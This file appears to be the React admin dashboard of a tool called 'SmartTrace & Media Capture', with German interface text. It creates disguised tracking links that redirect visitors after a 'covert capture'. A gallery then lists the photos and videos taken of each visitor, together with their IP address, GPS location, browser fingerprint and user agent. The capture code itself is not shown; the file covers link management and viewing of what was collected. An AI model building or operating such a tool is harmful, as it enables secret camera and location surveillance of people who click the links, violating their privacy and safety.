import { useState } from "react";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Shield, Link as LinkIcon, Camera, Trash2, ExternalLink, Copy, Check, LogIn, RefreshCw, ChevronLeft, ChevronRight, Globe, HardDrive } from "lucide-react";
import { toast } from "sonner";
import { startLogin } from "@/const";

export default function Home() {
  const { user, isAuthenticated, logout } = useAuth();

  const [linkId, setLinkId] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://example.com");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Filter & Pagination state for gallery
  const [selectedFilterId, setSelectedFilterId] = useState<string>("all");
  const [currentPage, setCurrentPage] = useState(1);
  const pageSize = 6;

  // Queries
  const linksQuery = trpc.tracking.listLinks.useQuery(undefined, {
    enabled: isAuthenticated,
  });

  const capturesQuery = trpc.captures.list.useQuery(
    { linkId: selectedFilterId === "all" ? undefined : selectedFilterId },
    { enabled: isAuthenticated }
  );

  const smtpStatusQuery = trpc.status.smtpStatus.useQuery(undefined, {
    enabled: isAuthenticated,
  });

  // Mutations
  const createLinkMutation = trpc.tracking.createLink.useMutation({
    onSuccess: () => {
      toast.success("Tracking-Link erfolgreich erstellt.");
      setLinkId("");
      linksQuery.refetch();
    },
    onError: (err) => {
      toast.error(err.message || "Fehler beim Erstellen des Links.");
    },
  });

  const deleteLinkMutation = trpc.tracking.deleteLink.useMutation({
    onSuccess: () => {
      toast.success("Tracking-Link und verbundene Captures gelöscht.");
      linksQuery.refetch();
      capturesQuery.refetch();
    },
  });

  const deleteCaptureMutation = trpc.captures.delete.useMutation({
    onSuccess: () => {
      toast.success("Aufnahme gelöscht.");
      capturesQuery.refetch();
    },
  });

  const clearAllMutation = trpc.captures.clearAll.useMutation({
    onSuccess: () => {
      toast.success("Alle Aufnahmen bereinigt.");
      capturesQuery.refetch();
    },
  });

  const handleCreateLink = (e: React.FormEvent) => {
    e.preventDefault();
    if (!linkId.trim() || !redirectUrl.trim()) {
      toast.error("Bitte füllen Sie alle Felder aus.");
      return;
    }
    createLinkMutation.mutate({ id: linkId.trim(), redirectUrl: redirectUrl.trim() });
  };

  const copyToClipboard = (text: string, id: string) => {
    const fullUrl = `${window.location.origin}/t/${id}`;
    navigator.clipboard.writeText(fullUrl);
    setCopiedId(id);
    toast.success("Link in die Zwischenablage kopiert!");
    setTimeout(() => setCopiedId(null), 2000);
  };

  const allCaptures = capturesQuery.data || [];
  const totalPages = Math.ceil(allCaptures.length / pageSize) || 1;
  const paginatedCaptures = allCaptures.slice((currentPage - 1) * pageSize, currentPage * pageSize);
  const totalLinks = linksQuery.data?.length || 0;
  const isSmtpConfigured = smtpStatusQuery.data?.configured ?? false;

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-indigo-950/40 via-slate-950 to-slate-950 pointer-events-none" />
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl relative z-10 rounded-2xl overflow-hidden">
          <div className="h-2 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500" />
          <CardHeader className="text-center space-y-4 pt-8 pb-6">
            <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30 shadow-inner">
              <Shield className="w-8 h-8" />
            </div>
            <div>
              <CardTitle className="text-2xl font-bold tracking-tight text-white">SmartTrace Admin</CardTitle>
              <CardDescription className="text-slate-400 mt-1">
                Sicheres Kontrollzentrum für Tracking-Links & Medien-Erfassung
              </CardDescription>
            </div>
          </CardHeader>
          <CardContent className="space-y-4 pb-8 px-6">
            <Button 
              onClick={() => startLogin()} 
              className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl shadow-lg shadow-indigo-600/30 transition-all flex items-center justify-center gap-2 group text-base"
            >
              <LogIn className="w-5 h-5 group-hover:translate-x-0.5 transition-transform" />
              Anmelden mit Manus
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans">
      {/* Header */}
      <header className="border-b border-slate-800/80 bg-slate-900/70 backdrop-blur-xl sticky top-0 z-50 px-6 py-4 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-md shadow-indigo-600/30">
            <Shield className="w-5 h-5" />
          </div>
          <div>
            <h1 className="text-base font-bold tracking-tight text-white flex items-center gap-2">
              SmartTrace & Media Capture
              <span className="text-[10px] bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 px-2 py-0.5 rounded-full font-mono">Pro v2.0</span>
            </h1>
            <p className="text-xs text-slate-400">Verdeckte Erfassung, SMTP-Benachrichtigung & Echtzeit-Verwaltung</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-slate-900 border border-slate-800 rounded-xl text-xs text-slate-300">
            <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            Angemeldet als <strong className="text-indigo-400">{user?.name || user?.email}</strong>
          </div>
          <Button variant="outline" size="sm" onClick={() => logout()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
            Abmelden
          </Button>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-6 space-y-8">
        {/* Stats Row */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-5 backdrop-blur-md flex items-center justify-between shadow-lg">
            <div className="space-y-1">
              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">Aktive Tracking-Links</p>
              <p className="text-2xl font-bold text-white">{totalLinks}</p>
            </div>
            <div className="w-12 h-12 bg-indigo-600/20 border border-indigo-500/30 rounded-xl flex items-center justify-center text-indigo-400">
              <Globe className="w-6 h-6" />
            </div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-5 backdrop-blur-md flex items-center justify-between shadow-lg">
            <div className="space-y-1">
              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">Erfasste Aufnahmen</p>
              <p className="text-2xl font-bold text-white">{allCaptures.length}</p>
            </div>
            <div className="w-12 h-12 bg-purple-600/20 border border-purple-500/30 rounded-xl flex items-center justify-center text-purple-400">
              <Camera className="w-6 h-6" />
            </div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-5 backdrop-blur-md flex items-center justify-between shadow-lg">
            <div className="space-y-1">
              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">SMTP Benachrichtigungen</p>
              <p className={`text-2xl font-bold ${isSmtpConfigured ? "text-emerald-400" : "text-amber-400"}`}>
                {isSmtpConfigured ? "Aktiv" : "Nicht konfiguriert"}
              </p>
            </div>
            <div className={`w-12 h-12 rounded-xl flex items-center justify-center border ${isSmtpConfigured ? "bg-emerald-600/20 border-emerald-500/30 text-emerald-400" : "bg-amber-600/20 border-amber-500/30 text-amber-400"}`}>
              <HardDrive className="w-6 h-6" />
            </div>
          </div>
        </div>

        {/* Tabs & Content */}
        <Tabs defaultValue="generator" className="space-y-6">
          <TabsList className="bg-slate-900 border border-slate-800 p-1.5 rounded-2xl inline-flex gap-2">
            <TabsTrigger value="generator" className="rounded-xl px-5 py-2.5 data-[state=active]:bg-indigo-600 data-[state=active]:text-white data-[state=active]:shadow-lg data-[state=active]:shadow-indigo-600/30 text-slate-400 font-medium transition-all flex items-center gap-2">
              <LinkIcon className="w-4 h-4" /> Link-Generator & Verwaltung
            </TabsTrigger>
            <TabsTrigger value="gallery" className="rounded-xl px-5 py-2.5 data-[state=active]:bg-indigo-600 data-[state=active]:text-white data-[state=active]:shadow-lg data-[state=active]:shadow-indigo-600/30 text-slate-400 font-medium transition-all flex items-center gap-2">
              <Camera className="w-4 h-4" /> Erfassungs-Galerie ({allCaptures.length})
            </TabsTrigger>
          </TabsList>

          {/* Generator Tab */}
          <TabsContent value="generator" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Form Card */}
              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-1 rounded-2xl shadow-xl">
                <CardHeader className="space-y-2">
                  <CardTitle className="text-lg text-white flex items-center gap-2">
                    <LinkIcon className="w-5 h-5 text-indigo-400" />
                    Neuer Tracking-Link
                  </CardTitle>
                  <CardDescription className="text-slate-400 text-xs">
                    Geben Sie eine eindeutige ID und die Ziel-URL ein, zu der Besucher nach der Aufnahme weitergeleitet werden.
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <form onSubmit={handleCreateLink} className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">Tracking ID (Pfad)</label>
                      <Input
                        placeholder="z.B. promo-2026"
                        value={linkId}
                        onChange={(e) => setLinkId(e.target.value)}
                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">Ziel-Weiterleitungs-URL</label>
                      <Input
                        placeholder="https://example.com"
                        value={redirectUrl}
                        onChange={(e) => setRedirectUrl(e.target.value)}
                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                      />
                    </div>
                    <Button type="submit" disabled={createLinkMutation.isPending} className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl transition-all shadow-lg shadow-indigo-600/20">
                      {createLinkMutation.isPending ? "Erstelle..." : "Tracking-Link generieren"}
                    </Button>
                  </form>
                </CardContent>
              </Card>

              {/* Links Table */}
              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-2 rounded-2xl shadow-xl">
                <CardHeader className="flex flex-row items-center justify-between pb-4">
                  <div>
                    <CardTitle className="text-lg text-white">Aktive Tracking-Links</CardTitle>
                    <CardDescription className="text-slate-400 text-xs">Übersicht aller generierten Tracking-Links und Weiterleitungen</CardDescription>
                  </div>
                  <Button variant="outline" size="sm" onClick={() => linksQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
                    <RefreshCw className="w-4 h-4 mr-1.5" /> Aktualisieren
                  </Button>
                </CardHeader>
                <CardContent>
                  {linksQuery.isLoading ? (
                    <div className="text-center py-16 text-slate-500">Lade Links...</div>
                  ) : linksQuery.data?.length === 0 ? (
                    <div className="text-center py-16 text-slate-500 space-y-2">
                      <Globe className="w-10 h-10 mx-auto opacity-30 text-slate-400" />
                      <p className="text-sm">Noch keine Links erstellt.</p>
                    </div>
                  ) : (
                    <div className="rounded-xl border border-slate-800 overflow-hidden shadow-sm">
                      <Table>
                        <TableHeader className="bg-slate-950/80">
                          <TableRow className="border-slate-800 hover:bg-transparent">
                            <TableHead className="text-slate-400 font-semibold">ID / Pfad</TableHead>
                            <TableHead className="text-slate-400 font-semibold">Ziel-URL</TableHead>
                            <TableHead className="text-slate-400 font-semibold">Erstellt am</TableHead>
                            <TableHead className="text-right text-slate-400 font-semibold">Aktionen</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {linksQuery.data?.map((link) => {
                            const fullUrl = `${window.location.origin}/t/${link.id}`;
                            return (
                              <TableRow key={link.id} className="border-slate-800 hover:bg-slate-800/40 transition-colors">
                                <TableCell className="font-semibold text-indigo-400">{link.id}</TableCell>
                                <TableCell className="text-slate-300 max-w-xs truncate">
                                  <a href={link.redirectUrl} target="_blank" rel="noreferrer" className="hover:underline flex items-center gap-1.5 text-xs text-slate-300">
                                    {link.redirectUrl} <ExternalLink className="w-3 h-3 opacity-60 flex-shrink-0" />
                                  </a>
                                </TableCell>
                                <TableCell className="text-slate-400 text-xs">{new Date(link.createdAt).toLocaleString()}</TableCell>
                                <TableCell className="text-right space-x-2">
                                  <Button
                                    size="sm"
                                    variant="outline"
                                    className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg h-9 px-3"
                                    onClick={() => copyToClipboard(fullUrl, link.id)}
                                    title="Link kopieren"
                                  >
                                    {copiedId === link.id ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                                  </Button>
                                  <Button
                                    size="sm"
                                    variant="destructive"
                                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-lg h-9 px-3"
                                    onClick={() => deleteLinkMutation.mutate({ id: link.id })}
                                    title="Löschen"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </Button>
                                </TableCell>
                              </TableRow>
                            );
                          })}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Gallery Tab */}
          <TabsContent value="gallery" className="space-y-6">
            <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md rounded-2xl shadow-xl">
              <CardHeader className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4">
                <div>
                  <CardTitle className="text-lg text-white">Erfasste Besucherdaten & Medien</CardTitle>
                  <CardDescription className="text-slate-400 text-xs">Übersicht aller erfassten Fotos, Videos und Client-Metadaten</CardDescription>
                </div>
                <div className="flex flex-wrap items-center gap-3">
                  <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5">
                    <span className="text-xs text-slate-400">Filter ID:</span>
                    <select
                      value={selectedFilterId}
                      onChange={(e) => {
                        setSelectedFilterId(e.target.value);
                        setCurrentPage(1);
                      }}
                      className="bg-transparent border-none text-slate-200 text-xs outline-none cursor-pointer"
                    >
                      <option value="all" className="bg-slate-900">Alle Links</option>
                      {linksQuery.data?.map((l) => (
                        <option key={l.id} value={l.id} className="bg-slate-900">{l.id}</option>
                      ))}
                    </select>
                  </div>
                  <Button variant="outline" size="sm" onClick={() => capturesQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
                    <RefreshCw className="w-4 h-4 mr-1.5" /> Aktualisieren
                  </Button>
                  <Button
                    variant="destructive"
                    size="sm"
                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-xl"
                    onClick={() => {
                      if (confirm("Wirklich alle Aufnahmen für diesen Filter löschen?")) {
                        clearAllMutation.mutate({ linkId: selectedFilterId === "all" ? undefined : selectedFilterId });
                      }
                    }}
                  >
                    Bereinigen
                  </Button>
                </div>
              </CardHeader>
              <CardContent className="space-y-6">
                {capturesQuery.isLoading ? (
                  <div className="text-center py-16 text-slate-500">Lade Aufnahmen...</div>
                ) : allCaptures.length === 0 ? (
                  <div className="text-center py-20 text-slate-500 space-y-3">
                    <Camera className="w-12 h-12 mx-auto opacity-30 text-slate-400" />
                    <p className="text-sm">Noch keine Besucherdaten für diesen Filter erfasst.</p>
                  </div>
                ) : (
                  <>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                      {paginatedCaptures.map((cap) => {
                        const isVideo = cap.filePath.endsWith(".webm") || cap.filePath.endsWith(".mp4");
                        return (
                          <div key={cap.id} className="bg-slate-950 border border-slate-800/80 rounded-2xl overflow-hidden flex flex-col shadow-xl group hover:border-slate-700 transition-all">
                            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden">
                              {isVideo ? (
                                <video src={cap.filePath} controls className="w-full h-full object-cover" />
                              ) : (
                                <img src={cap.filePath} alt="Capture" className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" />
                              )}
                              <span className="absolute top-3 left-3 bg-slate-900/90 backdrop-blur-md text-indigo-400 text-xs px-2.5 py-1 rounded-lg border border-slate-700/80 font-mono shadow-md">
                                ID: {cap.linkId}
                              </span>
                            </div>
                            <div className="p-4 flex-1 flex flex-col justify-between space-y-4">
                              <div className="space-y-2 text-xs text-slate-300">
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">IP-Adresse:</span>
                                  <span className="font-mono text-white font-medium">{cap.ip}</span>
                                </div>
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">GPS:</span>
                                  <span className="font-mono text-indigo-300 truncate max-w-[180px]" title={cap.gps || ""}>{cap.gps}</span>
                                </div>
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">Auflösung:</span>
                                  <span className="font-mono text-white">{cap.resolution}</span>
                                </div>
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">Fingerprint:</span>
                                  <span className="font-mono text-slate-400 truncate max-w-[150px]" title={cap.fingerprint || ""}>
                                    {cap.fingerprint}
                                  </span>
                                </div>
                                <div className="text-[11px] text-slate-400 truncate pt-1 px-1" title={cap.userAgent || ""}>
                                  <span className="text-slate-500">UA:</span> {cap.userAgent}
                                </div>
                              </div>
                              <div className="flex items-center justify-between pt-3 border-t border-slate-800/80">
                                <span className="text-[11px] text-slate-500">{new Date(cap.createdAt).toLocaleString()}</span>
                                <Button
                                  size="sm"
                                  variant="destructive"
                                  className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 h-8 px-3 rounded-xl transition-all"
                                  onClick={() => deleteCaptureMutation.mutate({ id: cap.id })}
                                >
                                  <Trash2 className="w-3.5 h-3.5 mr-1" /> Löschen
                                </Button>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>

                    {/* Pagination Controls */}
                    {totalPages > 1 && (
                      <div className="flex items-center justify-between pt-6 border-t border-slate-800">
                        <span className="text-xs text-slate-400">
                          Seite <strong className="text-white">{currentPage}</strong> von <strong className="text-white">{totalPages}</strong> (Gesamt: <strong className="text-white">{allCaptures.length}</strong> Aufnahmen)
                        </span>
                        <div className="flex items-center gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            disabled={currentPage === 1}
                            onClick={() => setCurrentPage((p) => Math.max(p - 1, 1))}
                            className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl"
                          >
                            <ChevronLeft className="w-4 h-4 mr-1" /> Zurück
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            disabled={currentPage === totalPages}
                            onClick={() => setCurrentPage((p) => Math.min(p + 1, totalPages))}
                            className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl"
                          >
                            Weiter <ChevronRight className="w-4 h-4 ml-1" />
                          </Button>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  );
}
